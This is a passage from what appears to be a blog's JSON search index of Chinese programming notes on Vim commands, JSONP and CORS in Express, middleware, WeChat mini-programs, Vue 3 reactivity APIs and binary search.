之前刚刚删除的内容，会放入Vim编辑器的寄存器中。基于如此原理，可以将之认为成Windows操作系统的「剪切」操作。 先在想删除的行，按「d」「d」，进行删除操作； 再在想插入那行的前一行按「p」键即可。 l) 替换 将光标放到需要改的字符前，先按「r」键，再输入想更改的字符即可。 m) 跳转 顶部跳转命令：先按「Control」+「g」键，在终端底部调出一栏，然后输入「g」「g」即可； 底部跳转命令：先按「Control」+「g」键，在终端底部调出一栏，然后输入大写字母「g」即可； 特定行跳转命令：直接输入行号，然后输入大写字母「g」即可。 n) 查找命令 字符串查找： 输入英文斜杠「/」，后面紧接需要搜索的字符串即可。 查找下一个相同字符串，就紧接着按小写字母「n」； 查找上一个相同字符串，就紧接着按大写字母「N」。 配对括号查找： 在编程语言里，配对括号「 ( 」「 ) 」「 { 」「 } 」很常见，当定位到一个配对括号的一半时（注意光标要定位在该括号之前），按「%」，即可自动跳转到与之匹配的第一个配对括号处。 o) 替换字符串 当前行替换命令 在标准命令行模式下，光标定位到当前行，按英文冒号「 ：」，再输入s/oldstring/newstring/g 回车，即可。 完整语句为： :s/dogg/dog/g 特定几行替换命令 在标准命令行模式下，按英文冒号「 ：」，再输入#,#s/oldstring/newstring/g 回车，即可（其中#代表特定的首尾两行的行号）。 完整语句为： ***:*5,8s/dogg/dog/g 全文替换命令 在标准命令行模式下，按英文冒号「 ：」，再输入%s/oldstring/newstring/g 回车，即可（其中#代表特定的首尾两行的行号）。 完整语句为： *:*%s/dogg/dog/g 全文替换命令（每个匹配项替换前需确认） 在标准命令行模式下，按英文冒号「 ：」，再输入%s/oldstring/newstring/gc 回车，即可（其中#代表特定的首尾两行的行号）。 完整语句为： *:*%s/dogg/dog/gc","categories":[{"name":"vim","slug":"vim","permalink":"https://coloey.github.io/categories/vim/"}],"tags":[]},{"title":"JSONP解决跨域问题","slug":"JSONP解决跨域问题","date":"2022-03-14T09:46:33.000Z","updated":"2022-03-14T09:54:26.273Z","comments":true,"path":"2022/03/14/JSONP解决跨域问题/","link":"","permalink":"https://coloey.github.io/2022/03/14/JSONP%E8%A7%A3%E5%86%B3%E8%B7%A8%E5%9F%9F%E9%97%AE%E9%A2%98/","excerpt":"","text":"概念： 浏览器通过标签的src属性，请求服务器上的数据，同时服务器返回一个函数的调用，这种请求数据的方式·叫做JSONP 如果项目中已经配置了CORS跨域资源共享，为防止冲突,必须在配置CORS中间件之前声明JSONP的接口，否则JSONP接口会被处理成开启了CORS的接口 123456789101112131415161718192021222324252627const express=require(&#x27;express&#x27;)//创建web服务器const app=express()//导入路由模块const apirouter=require(&#x27;./apirouter&#x27;)//在配置cors中间件之前定义JSONP的接口app.get(&#x27;/api/jsonp&#x27;,(req,res)=&gt;&#123; //1 得到客户端请求的回调函数名称 const funcName=req.query.callback //2 定义发送到客户端的JSON格式数据对象 const data=&#123;name:&#x27;zs&#x27;,age:20&#125; //3 拼接一个函数调用的字符串 const scriptStr=`$&#123;funcName&#125;($&#123;JSON.stringify(data)&#125;)` //4 把拼接的字符串响应给客户端的&lt;script&gt;标签进行解析执行 res.send(scriptStr)&#125;)app.use(express.urlencoded(&#123;extended:false&#125;))//在路由之前配置cors中间件const cors=require(&#x27;cors&#x27;)app.use(cors())//将路由模块注册为全局中间件app.use(&#x27;/api&#x27;,apirouter)app.listen(80,()=&gt;&#123; console.log(&#x27;运行在http://127.0.0.1&#x27;)&#125;) 发请求：HTML 123456789101112131415161718192021222324252627&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=edge&quot;&gt; &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt; &lt;title&gt;Document&lt;/title&gt; &lt;script src=&quot;https://cdn.staticfile.org/jquery/1.10.0/jquery.min.js&quot;&gt; &lt;/script&gt;&lt;/head&gt;&lt;body&gt; &lt;button id=&quot;btnJsonp&quot;&gt;Jsonp&lt;/button&gt; &lt;script&gt; $(&#x27;#btnJsonp&#x27;).on(&#x27;click&#x27;,function()&#123; $.ajax(&#123; type:&#x27;GET&#x27;, url:&#x27;http://127.0.0.1/api/jsonp&#x27;, dataType:&#x27;jsonp&#x27;, success:function(res)&#123; console.log(res) &#125; &#125;) &#125;) &lt;/script&gt; &lt;/body&gt;&lt;/html&gt;","categories":[{"name":"Node","slug":"Node","permalink":"https://coloey.github.io/categories/Node/"},{"name":"Express","slug":"Node/Express","permalink":"https://coloey.github.io/categories/Node/Express/"}],"tags":[]},{"title":"基于cors解决跨域问题","slug":"基于cors解决跨域问题","date":"2022-03-14T06:29:06.000Z","updated":"2022-03-14T09:13:22.067Z","comments":true,"path":"2022/03/14/基于cors解决跨域问题/","link":"","permalink":"https://coloey.github.io/2022/03/14/%E5%9F%BA%E4%BA%8Ecors%E8%A7%A3%E5%86%B3%E8%B7%A8%E5%9F%9F%E9%97%AE%E9%A2%98/","excerpt":"","text":"123456789101112131415161718192021222324252627282930apirouter.js:const express=require(&#x27;express&#x27;)//创建web服务器实例const router=express.Router()//挂载对应路由router.get(&#x27;/get&#x27;,(req,res)=&gt;&#123; res.send(&#123; status:0,//0表示成功，1表示失败 msg:&#x27;Get请求成功&#x27;, data:req.query &#125;)&#125;)//定义post接口router.post(&#x27;/post&#x27;,(req,res)=&gt;&#123; res.send(&#123; status:0,//0表示成功，1表示失败 msg:&#x27;Post请求成功&#x27;, data:req.body &#125;)&#125;)//定义delete接口router.delete(&#x27;/delete&#x27;,(req,res)=&gt;&#123; res.send(&#123; status:0,//0表示成功，1表示失败 msg:&#x27;Delete请求成功&#x27;, &#125;)&#125;)module.exports=router Get ,Post,Delete接口 123456789101112131415const express=require(&#x27;express&#x27;)//创建web服务器const app=express()//导入路由模块const apirouter=require(&#x27;./apirouter&#x27;)app.use(express.urlencoded(&#123;extended:false&#125;))//在路由之前配置cors中间件,解决跨域问题const cors=require(&#x27;cors&#x27;)app.use(cors())//将路由模块注册为全局中间件app.use(&#x27;/api&#x27;,apirouter)app.listen(80,()=&gt;&#123; console.log(&#x27;运行在http://127.0.0.1&#x27;)&#125;) 解决接口跨域问题CORS(主流方案) JSONP（有缺陷：只支持Get请求） 什么是CORSCORS(Cross-Origin Resource Sharing,跨域资源共享)，由一系列Http响应头组成，这些Http响应头决定浏览器是否阻止前端JS代码跨域获取资源。 浏览器的同源安全策略默认会阻止网页“跨域”获取资源，但如果接口服务器配置了CORS相关的HTTP响应头，就可以解决浏览器端的跨域访问限制。 浏览器：网页==》跨域请求 接口服务器（配置Access-Control-Allow-*相关响应头） ​ 《== 响应 CORS响应头部Access-Control-Allow-Origin响应头部可以携带一个Access-Control-Allow-Origin字段，语法如下： Access-Control-Allow-Origin:|* 其中origin参数指定了允许访问该资源的外域URL 例如：下面字段只允许访问来自http://itcast.cn的请求 res.setHeader(‘Access-Control-Allow-Origin’,’http://itcast.cn&#39;) *通配符表示允许来自任何域的请求 Access-Control-Allow-Headers默认情况下，CORS仅支持客户端向服务器发送9个请求头： Accept,Accept-Language,Content-Language,DPR,Downlink,Save-Data,Viewport-Width,Width,Content-Type(仅限于text-plain,multipart/form-data,application/x-www-form-urlencoded三者之一) 如果向服务器发送了额外的请求头信息，则需要在服务器端，通过Access-Control-Allow-Headers对额外的请求头进行声明，否则这次请求会失败 例如，允许客户端向服务器发送Content-Type请求头和X-Custom-Header请求头 res.setHeader(‘Access-Control-Allow-Header’,’Content-Type’,’X-Custom-Header’) Access-Control-Allow-Methods 默认情况下，CORS仅支持客户端发起GET,POST,HEAD请求。如果客户端希望通过PUT,DELETE等方式请求服务器的资源，则需要在服务器端，通过Access-Control-Allow-Methods来指明实际请求所允许的HTTP方法 123res.setHeader(&#x27;Access-Control-Allow-Methods&#x27;,&#x27;POST,GET,DELETE,HEAD&#x27;)//允许所有HTTP请求方法res.setHeader(&#x27;Access-Control-Allow-Methods&#x27;,&#x27;*&#x27;) 请求类型简单请求满足两个条件即为简单请求： 1 请求方式为GET,POST,HEAD三者之一 2 HTTP头部信息不超过以下几种字段：无定义头部字段，Accept,Accept-Language,Content-Language,Save-Data,Viewport-Width,Width,Content-Type(仅限于text-plain,multipart/form-data,application/x-www-form-urlencoded三者之一) 特点：客户端与服务器只发生一次请求 预检请求1 请求方式为GET,POST,HEAD之外的请求方法 2 请求头中包含自定义头部字段 3 向服务器发送了application/jso格式的数据 在浏览器服务器的正式通信之前，浏览器会先发送OPTION请求进行预检，以获知该服务器是否允许该实际请求，这一次OPTION称为预检请求，服务器成功响应预检请求后才会发送真正的请求并且携带真正的数据。 特点：客户端与服务器只发生两次请求 CORS注意事项1 CORS主要在服务器端进行配置，客户端浏览器无需做任何额外的配置，即可请求开启CORS的接口 2 CORS在浏览器中有兼容性，只有支持XMLHttpRequest Level2的浏览器才能正常访问开启了CORS的服务端接口（IE10+,Chrome4+等）","categories":[{"name":"Node","slug":"Node","permalink":"https://coloey.github.io/categories/Node/"},{"name":"Express","slug":"Node/Express","permalink":"https://coloey.github.io/categories/Node/Express/"}],"tags":[]},{"title":"自定义表单中间件","slug":"自定义表单中间件","date":"2022-03-13T15:13:46.000Z","updated":"2022-03-13T15:32:36.539Z","comments":true,"path":"2022/03/13/自定义表单中间件/","link":"","permalink":"https://coloey.github.io/2022/03/13/%E8%87%AA%E5%AE%9A%E4%B9%89%E8%A1%A8%E5%8D%95%E4%B8%AD%E9%97%B4%E4%BB%B6/","excerpt":"","text":"12345678910111213const express=require(&#x27;express&#x27;)//创建web服务器实例const app=express()//导入处理查询字符串的querystring,通过这个模块提供的parse()函数，可以查询字符串，解析成对象的格式//const qs=require(&#x27;querystring&#x27;)const customBodyParser=require(&#x27;./custom-body-parser&#x27;)app.use(customBodyParser)app.post(&#x27;/user&#x27;,(req,res)=&gt;&#123; res.send(req.body)&#125;)app.listen(80,()=&gt;&#123; console.log(&#x27;express server running at http://127.0.0.1&#x27;)&#125;) customBodyParser.js 1234567891011121314151617const qs=require(&#x27;querystring&#x27;)const bodyParser=(req,res,next)=&gt;&#123; //1 定义一个str字符串，专门用来存储客户端发送过来的请求体数据 let str=&quot;&quot; //监听req的data事件 req.on(&#x27;data&#x27;,(chunk)=&gt;&#123; str+=chunk &#125;) //监听req的end事件 req.on(&#x27;end&#x27;,()=&gt;&#123; //在str存放的是完整的请求体数据，解析成对象格式 调用qs.parse()方法，把查询字符串解析为对象 const body=qs.parse(str) req.body=body//将解析处的请求体数据挂载为req.body next() &#125;)&#125;module.exports=bodyParser","categories":[{"name":"Node","slug":"Node","permalink":"https://coloey.github.io/categories/Node/"},{"name":"Express","slug":"Node/Express","permalink":"https://coloey.github.io/categories/Node/Express/"}],"tags":[]},{"title":"路由","slug":"路由","date":"2022-03-12T15:34:29.000Z","updated":"2022-03-12T15:34:30.216Z","comments":true,"path":"2022/03/12/路由/","link":"","permalink":"https://coloey.github.io/2022/03/12/%E8%B7%AF%E7%94%B1/","excerpt":"","text":"","categories":[],"tags":[]},{"title":"中间件","slug":"中间件","date":"2022-03-12T07:57:20.000Z","updated":"2022-03-13T15:29:55.148Z","comments":true,"path":"2022/03/12/中间件/","link":"","permalink":"https://coloey.github.io/2022/03/12/%E4%B8%AD%E9%97%B4%E4%BB%B6/","excerpt":"","text":"使用express创建服务器，发起Get,Post请求123456789101112131415161718192021222324252627const express=require(&#x27;express&#x27;)//创建web服务器实例const app=express()//监听客户端的get请求post请求,并向客户端响应请求app.get(&#x27;/user&#x27;,(req,res)=&gt;&#123; res.send(&#123;name:&#x27;zs&#x27;,age:20,gender:&#x27;男&#x27;&#125;)&#125;)app.post(&#x27;/user&#x27;,(req,res)=&gt;&#123; res.send(&#x27;请求成功&#x27;)&#125;)//获取请求参数app.get(&quot;/&quot;,(req,res)=&gt;&#123; //req.query可以获取到客户端发送过来的查询参数向客户端响应一个查询参数 console.log(req.query) res.send(req.query)&#125;)//获取到URL中的动态参数app.get(&quot;/user/:id/:username&quot;,(req,res)=&gt;&#123; console.log(req.params) res.send(req.params)&#125;)//启动服务器app.listen(80,()=&gt;&#123; console.log(&#x27;express server running at http://127.0.0.1&#x27;)&#125;) 托管静态资源express.static()：创建一个静态资源服务器，通过如下代码可以将public目录下的图片，CSS文件，JavaScript文件对外开放访问 123456789101112const express=require(&#x27;express&#x27;)//创建web服务器实例const app=express()//托管多个静态资源目录,express.static会根据目录的添加顺序查找所需文件，http://127.0.0.1,public不出现在路径中app.use(express.static(&#x27;public&#x27;))app.use(express.static(&#x27;files&#x27;))//希望挂载前缀ap.use(&#x27;/public&#x27;,express.static(&#x27;public&#x27;,))//打开的是http://127.0.0.1/public，如果希望public出现在路径中则将访问前缀写public//启动服务器app.listen(80,()=&gt;&#123; console.log(&#x27;express server running at http://127.0.0.1&#x27;)&#125;) 中间件中间件的作用：多个中间件之间共享一份req和res,基于这种特性可以在上游的中间件中，统一为req或res对象添加自定义顶点属性或方法，供下游的中间件或路由进行使用 1234567891011121314151617const express=require(&quot;express&quot;)const app=express()//中间件的作用：共享req,resapp.use((req,res,next)=&gt;&#123; const time=Date.now() req.startTime=time next()&#125;)app.get(&#x27;/&#x27;,(req,res)=&gt;&#123; res.send(&#x27;Home page&#x27;+req.startTime)&#125;)app.get(&#x27;/user&#x27;,(req,res)=&gt;&#123; res.send(&#x27;User page&#x27;+req.startTime)&#125;)app.listen(80,()=&gt;&#123; console.log(&#x27;http://127.0.0.1&#x27;)&#125;) 中间件分类：[]: http://expressjs.com/en/guide/using-middleware.html 错误级别的中间件要注册在所有路由之后 1234567891011121314const express = require(&quot;express&quot;);const app=express()app.get(&#x27;/&#x27;,(req,res)=&gt;&#123; throw new Error(&#x27;服务器发生错误&#x27;) res.send(&#x27;Home page&#x27;)&#125;)//错误级别中间件必须注册在所有路由之后app.use((err,req,res,next)=&gt;&#123; console.error(err.message) res.send(&#x27;Something broke:&#x27;+err.message)&#125;)app.listen(80,()=&gt;&#123; console.log(&#x27;http://127.0.0.1&#x27;)&#125;) 使用中间件的注意事项 要在路由之前注册中间件 客户端发送过来的请求，可以连续调用多个中间件进行处理 执行完中间件的业务代码，要记得调用next（）函数 连续调用的多个中间件时，多个中间件间共享req和res对象","categories":[{"name":"Node","slug":"Node","permalink":"https://coloey.github.io/categories/Node/"},{"name":"Express","slug":"Node/Express","permalink":"https://coloey.github.io/categories/Node/Express/"}],"tags":[]},{"title":"Web和微信小程序中本地存储的差别","slug":"Web和微信小程序中本地存储的差别","date":"2022-03-01T09:23:54.000Z","updated":"2022-03-01T09:32:35.988Z","comments":true,"path":"2022/03/01/Web和微信小程序中本地存储的差别/","link":"","permalink":"https://coloey.github.io/2022/03/01/Web%E5%92%8C%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F%E4%B8%AD%E6%9C%AC%E5%9C%B0%E5%AD%98%E5%82%A8%E7%9A%84%E5%B7%AE%E5%88%AB/","excerpt":"","text":"Web和微信小程序中本地存储的差别使用上Web:localStorage.setItem(“key”,”value”) ​ localStorage.getItem(“key”) 小程序中：wx.setStorageSync(“key”,”value”); ​ wx.getStorageSync(“key”) 数据存储Web:不管存入的是什么类型的数据，最终都会先调用toString()，把数据编程字符串再存进去 小程序：不存在类型转换，存什么类型的数据进去，获取的就是什么类型的数据","categories":[{"name":"微信小程序","slug":"微信小程序","permalink":"https://coloey.github.io/categories/%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F/"}],"tags":[]},{"title":"swiper","slug":"swiper","date":"2022-02-28T03:27:42.000Z","updated":"2022-02-28T03:31:48.073Z","comments":true,"path":"2022/02/28/swiper/","link":"","permalink":"https://coloey.github.io/2022/02/28/swiper/","excerpt":"","text":"swiper存在默认宽度和高度：100%*150px image存在默认宽度和高度：320px*240px 设计图片和轮播图： 1 先看原图的宽高：750*340 2 让图片的高度自适应 宽度等于100% 3 让swiper标签的高度变成和图片的一样高即可 4 图片标签mode=“widthFix”","categories":[{"name":"微信小程序","slug":"微信小程序","permalink":"https://coloey.github.io/categories/%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F/"}],"tags":[]},{"title":"组件通信","slug":"组件通信","date":"2022-02-26T15:39:09.000Z","updated":"2022-02-26T15:40:12.435Z","comments":true,"path":"2022/02/26/组件通信/","link":"","permalink":"https://coloey.github.io/2022/02/26/%E7%BB%84%E4%BB%B6%E9%80%9A%E4%BF%A1/","excerpt":"","text":"父组件向子组件传递数据1 父组件中： 123&lt;view&gt; &lt;Tab tabs=&quot;&#123;&#123;tabs&#125;&#125;&quot; binditemChange=&quot;handleItemChange&quot;&gt;&lt;/Tab&gt;&lt;/view&gt; 2.子组件： 1234567properties: &#123; tabs:&#123; type:Array, value:[] &#125; &#125;, 子组件向父组件传递数据：1 子组件：用this.triggerEvent(“事件名”,传递的参数) 123456789methods:&#123; handle(e)&#123; const &#123;index&#125;=e.currentTarget.dataset; this.triggerEvent(&quot;itemChange&quot;,&#123;index&#125;); &#125; &#125; 2 父组件：用”bind+事件名”触发自定义方法 123&lt;view&gt; &lt;Tab tabs=&quot;&#123;&#123;tabs&#125;&#125;&quot; binditemChange=&quot;handleItemChange&quot;&gt;&lt;/Tab&gt;&lt;/view&gt; 12345678910handleItemChange(e)&#123; //console.log(e) const &#123;index&#125;=e.detail; let &#123;tabs&#125;=this.data; tabs.forEach((v,i)=&gt;i===index?v.isActive=true:v.isActive=false); this.setData(&#123; tabs &#125;) &#125;","categories":[{"name":"微信小程序","slug":"微信小程序","permalink":"https://coloey.github.io/categories/%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F/"}],"tags":[]},{"title":"事件绑定","slug":"事件绑定","date":"2022-02-25T09:06:50.000Z","updated":"2022-02-26T15:40:06.139Z","comments":true,"path":"2022/02/25/事件绑定/","link":"","permalink":"https://coloey.github.io/2022/02/25/%E4%BA%8B%E4%BB%B6%E7%BB%91%E5%AE%9A/","excerpt":"","text":"绑定输入事件 用bindinput 获取输入框的值用e.detail.value 输入框赋值用this.setData({num:e.detail.num}) 点击事件 关键字:bindtap 无法在小程序中的事件直接传参，通过自定义事件传参 事件源中获取自定义属性","categories":[{"name":"微信小程序","slug":"微信小程序","permalink":"https://coloey.github.io/categories/%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F/"}],"tags":[]},{"title":"路由参数","slug":"路由参数","date":"2022-02-06T08:51:25.000Z","updated":"2022-02-06T15:07:41.991Z","comments":true,"path":"2022/02/06/路由参数/","link":"","permalink":"https://coloey.github.io/2022/02/06/%E8%B7%AF%E7%94%B1%E5%8F%82%E6%95%B0/","excerpt":"","text":"query参数：12345678&lt;li v-for=&#x27;m in messageList&#x27; :key=&#x27;m.id&#x27;&gt; &lt;!-- 通过query传递参数 --&gt; &lt;router-link :to=&quot; &#123; name:&#x27;messageDetail&#x27;, query:&#123;id:m.id,title:m.title&#125; &#125;&quot;&gt;&#123;&#123;m.title&#125;&#125;&lt;/router-link&gt;&lt;/li&gt; params参数:1 配置路由声明接收param参数 1234567891011&#123;path:&#x27;/home&#x27;, component:Home, children:[ &#123;path:&#x27;news&#x27;, component:News&#125;, &#123;path:&#x27;message&#x27;, component:Message, children:[ &#123;path:&#x27;detail/:id/:title&#x27;,name:&#x27;messageDetail&#x27;,component:Detail&#125;//使用占位符声明接收params参数 ]&#125; ]&#125;, 2 传递参数 12345678910 &lt;li v-for=&#x27;m in messageList&#x27; :key=&#x27;m.id&#x27;&gt; &lt;!--跳转并携带params参数，to的字符写法--!&gt; &lt;router-link :to=&quot;`/home/message/detail/$&#123;m.id&#125;/$&#123;m.title&#125;`&quot;&gt;&#123;&#123;m.title&#125;&#125;&lt;/router-link&gt; &lt;!-- 对象写法只能写name不能写path --&gt; &lt;!-- &lt;router-link :to=&quot; &#123;name:&#x27;messageDetail&#x27;, params:&#123;id:m.id,title:m.title&#125; &#125;&quot;&gt;&#123;&#123;m.title&#125;&#125;&lt;/router-link&gt; --&gt;&lt;/li&gt; 注意：路由携带params参数时，若使用to的对象写法，则不能使用path配置项，必须使用name配置项 props配置123456789101112//props第一种写法，值为对象，该对象中的key-value都会以props的形式传给Detail组件props:&#123;a:1,b:&#x27;hello&#x27;&#125;,//props的第二种写法，值为布尔值，若布尔值为真，就会把该路由组件收到的所有params参数以props的形式传给Detail组件props:true,//第三种写法，值为函数props($route)&#123; return &#123;id:$route.query.id,title:$route.query.title&#125;&#125;,//解构赋值props(&#123;query&#125;)&#123; return &#123;id:query.id,title:query.title&#125;&#125; Detail组件接收参数： 123456&lt;script&gt;export default &#123; name:&#x27;Detail&#x27;, props:[&#x27;id&#x27;,&#x27;title&#x27;],&#125;&lt;/script&gt;","categories":[{"name":"Vue","slug":"Vue","permalink":"https://coloey.github.io/categories/Vue/"}],"tags":[]},{"title":"Vue3事件总线","slug":"Vue3事件总线","date":"2022-02-02T08:17:38.000Z","updated":"2022-02-02T08:38:36.586Z","comments":true,"path":"2022/02/02/Vue3事件总线/","link":"","permalink":"https://coloey.github.io/2022/02/02/Vue3%E4%BA%8B%E4%BB%B6%E6%80%BB%E7%BA%BF/","excerpt":"","text":"全局事件总线一种组件间的通信方式，适用于任意组件间的通信。 安装全局事件总线： 引入/编写事件库 在入口文件中挂载 在组件中引入并使用 安装：npm install –save vue3-eventbus 挂载： 123//App.vueimport eventBus from &#x27;vue3-eventbus&#x27;app.use(eventBus) 使用： 12345678//Button.vueimport bus from &#x27;vue3-eventbus&#x27;export default &#123; setup()&#123; bus.emit(&#x27;foo&#x27;,&#123;a:&#x27;b&#x27;&#125;) &#125;&#125; 消息订阅预发布（pubsub) 安装pubsub:npm install pubsub-js 引入：import pubsub from “pubsub-js” 接收数据，A组件想接收数据，则在A组件中订阅消息，订阅回调留在A组件自身。 12345678910methods()&#123; demo(data)&#123; &#125;&#125;mounted()&#123;this.pid=pubsub.subscribe(&#x27;xxx&#x27;,(msg,data)=&gt;&#123;&#125;)//订阅消息&#125; 提供数据：pubsub.publish(‘xxx’,数据) 最好在beforeDestroy钩子中，用Pubsub.unsubscribe(pid)取消订阅","categories":[{"name":"Vue","slug":"Vue","permalink":"https://coloey.github.io/categories/Vue/"}],"tags":[]},{"title":"customRef","slug":"customRef","date":"2022-02-01T08:55:59.000Z","updated":"2022-02-01T09:03:45.036Z","comments":true,"path":"2022/02/01/customRef/","link":"","permalink":"https://coloey.github.io/2022/02/01/customRef/","excerpt":"","text":"12345678910111213141516171819202122232425262728293031setup()&#123; function myRef(value,delay=500)&#123; let timeout return customRef((track,trigger)=&gt;&#123; return &#123; get()&#123; console.log(`有人从myRef中读取了数据:$&#123;value&#125;`) track()//通知Vue追踪value的变化（提前和get商量一下，让它认为这个value是可用的） return value &#125;, set(newValue)&#123; clearTimeout(timeout) console.log(`有人从myRef中修改了数据:$&#123;newValue&#125;`) timeout=setTimeout(()=&gt;&#123; value=newValue trigger()//通知Vue重新解析模板 &#125;,delay) &#125; &#125; &#125;) &#125; let val=myRef(&quot;hello&quot;) return &#123; val &#125; &#125;","categories":[{"name":"Vue","slug":"Vue","permalink":"https://coloey.github.io/categories/Vue/"}],"tags":[]},{"title":"shallowReactive和shallowRef","slug":"shallowReactive和shallowRef","date":"2022-01-31T08:41:52.000Z","updated":"2022-02-01T07:57:53.734Z","comments":true,"path":"2022/01/31/shallowReactive和shallowRef/","link":"","permalink":"https://coloey.github.io/2022/01/31/shallowReactive%E5%92%8CshallowRef/","excerpt":"","text":"shallowReactive:只处理对象最外层属性的响应式（浅响应式） shallowRef:只处理基本数据类型的响应式，不进行对象的响应式处理 什么时候使用？ 如果有一个对象数据，结构比较深，但变化时只是外层属性变化==&gt;shallowReactive 如果有一个对象数据，后续功能不会修改该对象中的属性，而是生新的对象来替换==&gt;shallowRef","categories":[{"name":"Vue","slug":"Vue","permalink":"https://coloey.github.io/categories/Vue/"}],"tags":[]},{"title":"toRef","slug":"toRef","date":"2022-01-31T07:49:20.000Z","updated":"2022-02-01T07:57:57.787Z","comments":true,"path":"2022/01/31/toRef/","link":"","permalink":"https://coloey.github.io/2022/01/31/toRef/","excerpt":"","text":"toRef:作用：创建一个ref对象，其value值指向另一个对象中的某个属性 语法：const name=toRef(person,’name’) 应用：要将响应式对象中的某个属性单独提供给外部使用时 扩展:toRefs与toRef功能一致，但可以批量创建多个ref对象，语法：toRefs(person),将响应式对象转换为普通对象，其中结果对象的每个 property 都是指向原始对象相应 property 的 ref。 1234567891011121314151617181920212223242526272829303132333435363738394041 setup()&#123; let person=reactive(&#123; firstName:&quot;张&quot;, lastName:&quot;三&quot;, fullName:&#x27;&#x27;, job:&#123; one:&#x27;doctor&#x27;, tow:&#x27;teacher&#x27; &#125; &#125;) person.fullName=computed(&#123; get()&#123; return person.firstName+&#x27;-&#x27;+person.lastName &#125;, set(value)&#123; const nameArr=value.split(&#x27;-&#x27;) person.firstName=nameArr[0] person.lastName=nameArr[1] &#125; &#125;) return &#123; person, firstName:toRef(person,&#x27;firstName&#x27;), lastName:toRef(person,&#x27;lastName&#x27;), one:toRef(person.job,&#x27;one&#x27;), fullName:toRef(person,&#x27;fullName&#x27;) &#125;//toRefs:/*return &#123; person, ...toRefs(person), &#125;*/ &#125;","categories":[{"name":"Vue","slug":"Vue","permalink":"https://coloey.github.io/categories/Vue/"}],"tags":[]},{"title":"watchEffect","slug":"watchEffect","date":"2022-01-30T15:44:30.000Z","updated":"2022-01-30T15:51:06.817Z","comments":true,"path":"2022/01/30/watchEffect/","link":"","permalink":"https://coloey.github.io/2022/01/30/watchEffect/","excerpt":"","text":"watch和watchEffect区别：watch:既要指明监视的属性，也要指明监视的回调 watchEffect:不用指明监视哪个属性，监视的回调中用到哪个属性就监视哪个属性 watchEffect有点像computed: 但computed注重的是计算出来的值即回调函数的返回值，所以必须要写返回值 而watch注重的是过程即回调函数的函数体，所以不用写返回值 123456789//watchEffect指定的回调函数中用到的数据只要发生变化，则直接重新执行回调 let sum=ref(1) let msg=ref(&quot;你好呀&quot;) watchEffect(()=&gt;&#123; const x1=sum.value const x2=person.firstName console.log(&#x27;watchEffect的回调被调用了&#x27;,x1,x2) &#125;)","categories":[{"name":"Vue","slug":"Vue","permalink":"https://coloey.github.io/categories/Vue/"}],"tags":[]},{"title":"二分查找","slug":"二分查找","date":"2022-01-30T07:37:59.000Z","updated":"2022-01-30T07:53:02.198Z","comments":true,"path":"2022/01/30/二分查找/","link":"","permalink":"https://coloey.github.io/2022/01/30/%E4%BA%8C%E5%88%86%E6%9F%A5%E6%89%BE/","excerpt":"","text":"大家写二分法经常写乱，主要是因为对区间的定义没有想清楚，区间的定义就是不变量。要在二分查找的过程中，保持不变量，就是在while寻找中每一次边界的处理都要坚持根据区间的定义来操作，这就是循环不变量规则。 写二分法，区间的定义一般为两种，左闭右闭即[left, right]，或者左闭右开即[left, right)。 下面我用这两种区间的定义分别讲解两种不同的二分写法。 二分法第一种写法第一种写法，我们定义 target 是在一个在左闭右闭的区间里，也就是[left, right] （这个很重要非常重要）。 区间的定义这就决定了二分法的代码应该如何写，因为定义target在[left, right]区间，所以有如下两点： while (left &lt;= right) 要使用 &lt;= ，因为left == right是有意义的，所以使用 &lt;= if (nums[middle] &gt; target) right 要赋值为 middle - 1，因为当前这个nums[middle]一定不是target，那么接下来要查找的左区间结束下标位置就是 middle - 1 1234567891011121314151617181920// 版本一class Solution &#123;public: int search(vector&lt;int&gt;&amp; nums, int target) &#123; int left = 0; int right = nums.size() - 1; // 定义target在左闭右闭的区间里，[left, right] while (left &lt;= right) &#123; // 当left==right，区间[left, right]依然有效，所以用 &lt;= int middle = left + ((right - left) / 2);// 防止溢出 等同于(left + right)/2 if (nums[middle] &gt; target) &#123; right = middle - 1; // target 在左区间，所以[left, middle - 1] &#125; else if (nums[middle] &lt; target) &#123; left = middle + 1; // target 在右区间，所以[middle + 1, right] &#125; else &#123; // nums[middle] == target return middle; // 数组中找到目标值，直接返回下标 &#125; &#125; // 未找到目标值 return -1; &#125;&#125;; 二分法第二种写法如果说定义 target 是在一个在左闭右开的区间里，也就是[left, right) ，那么二分法的边界处理方式则截然不同。 有如下两点： while (left &lt; right)，这里使用 &lt; ,因为left == right在区间[left, right)是没有意义的 if (nums[middle] &gt; target) right 更新为 middle，因为当前nums[middle]不等于target，去左区间继续寻找，而寻找区间是左闭右开区间，所以right更新为middle，即：下一个查询区间不会去比较nums[middle] 1234567891011121314151617181920// 版本二class Solution &#123;public: int search(vector&lt;int&gt;&amp; nums, int target) &#123; int left = 0; int right = nums.size(); // 定义target在左闭右开的区间里，即：[left, right) while (left &lt; right) &#123; // 因为left == right的时候，在[left, right)是无效的空间，所以使用 &lt; int middle = left + ((right - left) &gt;&gt; 1); if (nums[middle] &gt; target) &#123; right = middle; // target 在左区间，在[left, middle)中 &#125; else if (nums[middle] &lt; target) &#123; left = middle + 1; // target 在右区间，在[middle + 1, right)中 &#125; else &#123; // nums[middle] == target return middle; // 数组中找到目标值，直接返回下标 &#125; &#125; // 未找到目标值 return -1; &#125;&#125;;","categories":[{"name":"算法","slug":"算法","permalink":"https://coloey.github.io/categories/%E7%AE%97%E6%B3%95/"}],"tags":[]},{"title":"插槽","slug":"插槽","date":"2022-01-29T15:41:20.000Z","updated":"2022-01-29T15:58:25.041Z","comments":true,"path":"2022/01/29/插槽/","link":"","permalink":"https://coloey.github.io/2022/01/29/%E6%8F%92%E6%A7%BD/","excerpt":"","text":"1 作用： 让父组件可以向子组件指定位置插入html结构，是一种组件间的通信方式，适用于父组件=&gt;子组件 2 使用方式 （1）默认插槽 123456789101112父组件： &lt;Category&gt; &lt;div&gt; html结构 